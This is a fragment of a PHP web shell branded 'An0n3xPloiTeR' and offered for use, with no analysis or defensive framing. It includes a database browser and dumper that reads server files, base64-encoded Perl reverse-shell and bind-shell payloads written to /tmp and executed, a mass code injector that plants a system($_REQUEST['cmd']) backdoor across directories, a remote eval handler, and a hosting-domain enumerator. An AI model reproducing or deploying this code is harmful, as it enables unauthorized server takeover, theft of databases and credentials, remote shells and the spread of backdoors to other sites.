			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this->type)	{
				case 'mysql':
					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this->query("CREATE TABLE An0n3xPloiTeR2(file text);COPY An0n3xPloiTeR2 FROM '".addslashes($str)."';select file from An0n3xPloiTeR2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table An0n3xPloiTeR2');
					return array('file'=>implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
                    if($fp) fwrite($fp, $sql); else echo($sql);
					$this->query('SELECT * FROM `'.$table.'`');
                    $i = 0;
                    $head = true;
					while($item = $this->fetch()) {
                        $sql = '';
                        if($i % 1000 == 0) {
                            $head = true;
                            $sql = ";\n\n";
                        }

						$columns = array();
						foreach($item as $k=>$v) {
                            if($v === null)
                                $item[$k] = "NULL";
                            elseif(is_int($v))
                                $item[$k] = $v;
                            else
                                $item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
                            $head = false;
                        } else
                            $sql .= "\n\t,(".implode(", ", $item).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
                        $i++;
					}
                    if(!$head)
                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) {
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
        switch($_POST['charset']) {
            case "Windows-1251": $db->setCharset('cp1251'); break;
            case "UTF-8": $db->setCharset('utf8'); break;
            case "KOI8-R": $db->setCharset('koi8r'); break;
            case "KOI8-U": $db->setCharset('koi8u'); break;
            case "cp866": $db->setCharset('cp866'); break;
        }
        if(empty($_POST['file'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach($_POST['tbl'] as $v)
				$db->dump($v);
            exit;
        } elseif($fp = @fopen($_POST['file'], 'w')) {
            foreach($_POST['tbl'] as $v)
                $db->dump($v, $fp);
            fclose($fp);
            unset($_POST['p2']);
        } else
            die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
	}
	An0n3xPloiTeRHeader();
	echo "
<center><h1>Sql browser</h1></center><div class=content>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
<td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>";
	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<select name=sql_base><option value=''></option>";
			while($item = $db->fetch()) {
				list($key, $value) = each($item);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "</td>
				<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>";
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($item = $db->fetch($tbls_res)) {
					list($key, $value) = each($item);
                    if(!empty($_POST['sql_count']))
                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db->fetch();
					$pages = ceil($num['n'] / 30);
                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
                    echo " of $pages";
                    if($_POST['p3'] > 1)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";
                    if($_POST['p3'] < $pages)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";
                    $_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db->query(@$_POST['p2']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($item as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                    echo htmlspecialchars($_POST['p2']);
                echo "</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/>";
            if($_POST['type']=='mysql') {
                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
            }
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db->loadFile($_POST['p2']);
				echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	} else {
        echo htmlspecialchars($db->error());
    }
	echo '</div>';
	An0n3xPloiTeRFooter();
}
function actionNetwork() {
	An0n3xPloiTeRHeader();
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<center><h1>Back Connecter Via Perl</h1></center><div class=content>
	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
	<span>Bind port to /bin/sh [perl]</span><br/>
	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form>
	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
	<span>Back-connect  [perl]</span><br/>
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form><br>";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w = @fopen($f,"w") or @function_exists('file_put_contents');
			if($w){
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$out = An0n3xPloiTeREx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre class=ml1>$out\n".An0n3xPloiTeREx("ps aux | grep bp.pl")."</pre>";
            unlink("/tmp/bp.pl");
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = An0n3xPloiTeREx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
            sleep(1);
			echo "<pre class=ml1>$out\n".An0n3xPloiTeREx("ps aux | grep bc.pl")."</pre>";
            unlink("/tmp/bc.pl");
		}
	}
	echo '</div>';
	An0n3xPloiTeRFooter();
}

function actionInjector(){
    An0n3xPloiTeRHeader();
    echo '<center><h1>Mass Code Injector</h1></center>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : '3xp1r3 Cyber Army';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:#df5;"> are injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:#df5;"> are injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="index"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"><?php
if (isset($_REQUEST["cmd"])) {
    system($_REQUEST["cmd"]);
}
?></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';
    An0n3xPloiTeRFooter();
}

function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"An0n3xPloiTeR_version" => An0n3xPloiTeR_VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}

function actionDomain() {
    An0n3xPloiTeRHeader();

echo '<center><h1>Local Domains</h1></center><div class=content><br>';                                      
$file = @implode(@file("/etc/named.conf"));                                                                  
$Domain_path = "/var/named";

if (!$file) {
$domains = scandir($Domain_path);
$count=1;
$dc = 0;
 echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2><center>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.</center></td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
foreach ($domains as &$domain) {
    if (stripos($domain,".db")) {
    $domain = str_replace('.db','',$domain);

    }
    if (strlen($domain) > 6) {
        
        echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>User</td></tr>";


    }
    
   } 
 echo "</table>";
}else{
        $count = 1;
        preg_match_all("#named/(.*?).db#", $file, $r);
        $domains = array_unique($r[1]);
                                                                                echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2> There are  ( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
<tr><td>No</td><td>Domain</td><td>User</td></tr>";
        foreach ($domains as $domain) {

        $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
        echo "<tr><td>".$count++."</td><td><a href='http://".$domain."' target='_blank'>".$domain."</a></td><td>".$user['name']."</td></tr>";
     }
}
                                                                        
                                                                   An0n3xPloiTeRFooter();
                                                                }

if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('action' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
exit;

?>